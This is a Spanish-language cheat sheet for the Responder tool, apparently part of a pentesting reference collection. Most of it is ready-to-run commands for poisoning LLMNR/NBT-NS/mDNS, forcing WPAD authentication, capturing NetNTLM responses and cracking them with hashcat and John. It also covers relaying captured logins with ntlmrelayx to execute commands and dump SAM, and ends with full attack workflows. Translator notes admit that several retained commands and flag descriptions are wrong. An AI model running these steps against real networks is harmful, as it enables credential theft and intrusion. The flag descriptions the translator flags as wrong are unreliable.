# 🎣 Responder: suplantación de respuestas LLMNR/NBT-NS

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗ ███████╗███████╗██████╗  ██████╗ ███╗   ██╗██████╗ ███████╗██████╗ 
  ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗████╗  ██║██╔══██╗██╔════╝██╔══██╗
  ██████╔╝█████╗  ███████╗██████╔╝██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
  ██╔══██╗██╔══╝  ╚════██║██╔═══╝ ██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
  ██║  ██║███████╗███████║██║     ╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║
  ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
               Suplantación de LLMNR/NBT-NS/mDNS
```

<p align="center">
  <img src="https://img.shields.io/badge/Responder-NTLM_Capture-red?style=for-the-badge" alt="Responder">
  <img src="https://img.shields.io/badge/LLMNR-Poisoning-blue?style=for-the-badge" alt="LLMNR">
</p>

---

## 📋 Índice

- [Qué es Responder](#-qué-es-responder)
- [Instalación](#-instalación)
- [Uso básico](#-uso-básico)
- [Captura de hashes NTLMv2](#-captura-de-hashes-ntlmv2)
- [Ataques de retransmisión (relay)](#-ataques-de-retransmisión-relay)
- [Servidores falsos](#-servidores-falsos)
- [Configuración](#-configuración)
- [Referencia rápida](#-referencia-rápida)

---

## 🎯 Qué es Responder

> **Precisión técnica:** En la red se capturan respuestas de desafío/respuesta NetNTLM, no el hash NT almacenado de la contraseña. El término hash se conserva por su uso habitual. Una retransmisión NTLM utiliza un intercambio de autenticación activo; no equivale a reutilizar después un archivo NetNTLMv2 capturado.

**Responder** suplanta respuestas LLMNR, NBT-NS y mDNS para capturar hashes NTLM:

- 🎣 **Suplantación de LLMNR** - Link-Local Multicast Name Resolution (resolución multicast de nombres en el enlace local)
- 📡 **Suplantación de NBT-NS** - NetBIOS Name Service (servicio de nombres NetBIOS)
- 🍎 **Suplantación de mDNS** - DNS multicast
- 🔓 **Captura de hashes** - Hashes NTLMv1/NTLMv2
- 🔄 **Compatibilidad con retransmisión** - Ataques de retransmisión NTLM

### Cómo funciona

```
1. El usuario escribe un nombre de equipo incorrecto: \\fileservr (errata)
2. DNS no consigue resolver el nombre
3. Windows difunde una consulta LLMNR/NBT-NS
4. Responder responde: "I'm fileservr!" (se hace pasar por el equipo solicitado)
5. La víctima envía un hash NTLM para autenticarse
6. Se captura el hash para recuperar la contraseña o retransmitir la autenticación
```

---

## 🚀 Instalación

### Kali Linux

```bash
# Preinstalado
responder --help

# Actualizar
sudo apt update && sudo apt install responder

# O desde GitHub
git clone https://github.com/lgandx/Responder.git
cd Responder
python Responder.py --help
```

### Verificar

```bash
responder --help
responder -I eth0 --version
```

---

## 💻 Uso básico

### Iniciar Responder

```bash
# Uso básico (capturar hashes)
sudo responder -I eth0

# Salida detallada
sudo responder -I eth0 -v

# Modo de análisis (pasivo)
sudo responder -I eth0 -A
```

### Selección de la interfaz

```bash
# Ethernet
sudo responder -I eth0

# Red inalámbrica
sudo responder -I wlan0

# Enumerar interfaces
ip a
```

---

## 🔓 Captura de hashes NTLMv2

### Captura básica

```bash
# Iniciar Responder
sudo responder -I eth0

# Esperar a los equipos objetivo...
# Salida:
[+] Listening for events...
[HTTP] NTLMv2 Client   : 192.168.1.100
[HTTP] NTLMv2 Username : DOMAIN\user
[HTTP] NTLMv2 Hash     : user::DOMAIN:1122334455667788:...
```

### Forzar NTLMv2

> **Corrección del original:** `--lm` solicita una degradación a LM en clientes antiguos; no fuerza NTLMv2. El comentario y la orden originales se mantienen para conservar el ejemplo, pero describen comportamientos opuestos. Fuente: [opciones oficiales de Responder](https://github.com/lgandx/Responder/blob/master/Responder.py).

```bash
# Solo NTLMv2 (recomendado para recuperar contraseñas, según el original)
sudo responder -I eth0 --lm
```

### Captura mediante WPAD

```bash
# Activar el proxy WPAD
sudo responder -I eth0 -w

# Forzar la autenticación de WPAD
sudo responder -I eth0 -wF
```

### Ubicación de los hashes

```bash
# Los hashes capturados se guardan en:
/usr/share/responder/logs/
# O bien
./logs/

# Archivos:
Responder-Session.log
SMB-NTLMv2-*.txt
HTTP-NTLMv2-*.txt
```

### Recuperar contraseñas a partir de los hashes capturados

```bash
# Formato NTLMv2:
# user::DOMAIN:ServerChallenge:NTProofStr:NTLMv2Response

# Hashcat (modo 5600)
hashcat -m 5600 hash.txt wordlist.txt

# John
john --format=netntlmv2 hash.txt
```

---

## 🔄 Ataques de retransmisión (relay)

> **Requisitos:** Desactivar los servidores SMB/HTTP evita conflictos con los servicios de escucha de ntlmrelayx. El resultado depende de las protecciones del servicio de destino, como la firma y la protección extendida, y de los derechos de la cuenta retransmitida; no basta con capturar una autenticación.

### Desactivar SMB/HTTP (para la retransmisión)

```bash
# Editar Responder.conf
sudo nano /usr/share/responder/Responder.conf

# Establecer:
SMB = Off
HTTP = Off
```

### Responder y ntlmrelayx

```bash
# Terminal 1: Responder (sin SMB/HTTP)
sudo responder -I eth0

# Terminal 2: ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# O con ejecución de comandos
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

### Retransmitir a LDAP

```bash
# Responder
sudo responder -I eth0

# Retransmitir a LDAP
impacket-ntlmrelayx -t ldap://DC01.domain.local
```

### Retransmisión para extraer SAM

> **Compatibilidad:** `--sam` no figura entre las opciones de ntlmrelayx en la versión consultada. La extracción SAM por SMB puede ser el comportamiento predeterminado cuando no se indica otra acción y los permisos lo permiten. Se conserva la orden original. Fuente: [script oficial de ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py).

```bash
# Extraer SAM mediante retransmisión
impacket-ntlmrelayx -tf targets.txt -smb2support --sam
```

---

<a id="-servidores-falsos"></a>
## 🖥️ Servidores falsos

### Servidores integrados

| Servidor | Puerto | Finalidad |
|--------|------|---------|
| SMB | 445 | Autenticación de recursos compartidos de archivos |
| HTTP | 80 | Autenticación web |
| HTTPS | 443 | Web segura |
| FTP | 21 | Autenticación FTP |
| SQL | 1433 | Autenticación MSSQL |
| LDAP | 389 | Autenticación de directorio |
| WPAD | 80 | Configuración del proxy |

### Activar o desactivar servidores

```bash
# Editar Responder.conf
[Responder Core]
; Servidores que se iniciarán
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
```

### Proxy WPAD falso

> **Compatibilidad:** `-F` solicita autenticación al recuperar wpad.dat y no implica necesariamente HTTP Basic; `--wpad-name` no aparece en las opciones de la versión consultada. Los ejemplos se mantienen. Fuente: [analizador de opciones de Responder](https://github.com/lgandx/Responder/blob/master/Responder.py).

```bash
# Activar WPAD
sudo responder -I eth0 -w

# Forzar la autenticación básica de WPAD, según el comentario original
sudo responder -I eth0 -wF

# Script WPAD personalizado
sudo responder -I eth0 -w --wpad-name wpad.dat
```

### Suplantación de DNS

> **Corrección del original:** `-d` activa la suplantación DHCPv4 e inyecta WPAD; no es una opción genérica para activar el servidor DNS. El servidor DNS se configura por separado. Esta descripción incorrecta también aparece en las tablas de referencia. Fuente: [opciones oficiales de Responder](https://github.com/lgandx/Responder/blob/master/Responder.py).

```bash
# Activar DNS
sudo responder -I eth0 -d

# Responder actúa como servidor DNS
# Responde a consultas sobre todos los equipos
```

---

<a id="-configuración"></a>
## ⚙️ Configuración

### Responder.conf

```bash
# Ubicación
/usr/share/responder/Responder.conf
# O bien
./Responder.conf
```

### Opciones principales

> **Aclaración:** `DontRespondTo` y `RespondTo` filtran direcciones IP; dejar la primera lista vacía no excluye automáticamente todas las consultas locales. Las rutas de configuración y registros dependen de la instalación. Véase la [configuración oficial](https://github.com/lgandx/Responder/blob/master/Responder.conf).

```ini
[Responder Core]
; Establecer On u Off
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On

; Desafío personalizado (para tablas rainbow)
Challenge = Random

; No responder a consultas locales, según el comentario original
DontRespondTo =

; Responder solo a estas IP
RespondTo =
```

### Desafío fijo (tablas rainbow)

> **Alcance:** Un desafío fijo no convierte cualquier captura NetNTLMv2 en un caso recuperable mediante tablas precalculadas. La utilidad de esas tablas depende del protocolo y del formato, especialmente en técnicas históricas con NetNTLMv1.

```ini
; Establecer un desafío fijo para tablas precalculadas
Challenge = 1122334455667788
```

### Exclusiones

```ini
; No responder a estas IP
DontRespondTo = 192.168.1.1, 192.168.1.2

; Responder solo a estas
RespondTo = 192.168.1.100, 192.168.1.101
```

---

## 📊 Referencia rápida

### Comandos esenciales

| Comando | Descripción |
|---------|-------------|
| `responder -I eth0` | Captura básica |
| `responder -I eth0 -v` | Modo detallado |
| `responder -I eth0 -A` | Solo analizar |
| `responder -I eth0 -w` | Activar WPAD |
| `responder -I eth0 -wF` | Forzar la autenticación de WPAD |
| `responder -I eth0 -d` | Activar DNS |

### Opciones

| Opción | Descripción |
|------|-------------|
| `-I` | Interfaz |
| `-v` | Salida detallada |
| `-A` | Modo de análisis (pasivo) |
| `-w` | Activar WPAD |
| `-wF` | Forzar la autenticación de WPAD |
| `-d` | Activar DNS |
| `-f` | Identificar las características de los equipos |
| `-b` | Responder con autenticación básica |

### Tipos de hash

| Tipo | Modo de Hashcat | Formato de John |
|------|--------------|-------------|
| NTLMv1 | 5500 | netntlm |
| NTLMv2 | 5600 | netntlmv2 |

### Flujo de trabajo del ataque

> **Aclaración:** El comodín del ejemplo puede incluir distintos formatos NTLM o varios archivos; el modo 5600 requiere entradas NetNTLMv2 compatibles. El flujo de retransmisión presupone que también se han aplicado los ajustes SMB/HTTP descritos antes.

```bash
# 1. Iniciar Responder
sudo responder -I eth0 -wFv

# 2. Esperar a que se capturen hashes
# Los hashes se guardan en ./logs/

# 3. Recuperar contraseñas a partir de los hashes
hashcat -m 5600 ./logs/*NTLM*.txt rockyou.txt

# 4. O retransmitir la autenticación (desactivar SMB primero)
sudo responder -I eth0  # SMB=Off en la configuración
impacket-ntlmrelayx -tf targets.txt -smb2support
```

### Flujo de trabajo de la retransmisión

```bash
# 1. Buscar objetivos que no exijan firma SMB
cme smb 10.10.10.0/24 --gen-relay-list relay.txt

# 2. Configurar Responder.conf
# SMB = Off
# HTTP = Off

# 3. Iniciar Responder
sudo responder -I eth0

# 4. Iniciar la retransmisión
impacket-ntlmrelayx -tf relay.txt -smb2support

# 5. Esperar a que se retransmita una autenticación
```

---

## 📚 Recursos

- [Responder GitHub](https://github.com/lgandx/Responder)
- [Suplantación de LLMNR](https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/)
- [ntlmrelayx](https://github.com/fortra/impacket)

### Guías de consulta relacionadas
- [Impacket](../../Impacket/translations/README.es.md)
- [CrackMapExec](../../CrackMapExec/translations/README.es.md)
- [Hashcat](../../Hashcat/translations/README.es.md)

---

<p align="center">
  <b>🎣 ¡Captura esos hashes!</b><br>
  <i>Responder: recolector de credenciales de red</i>
</p>
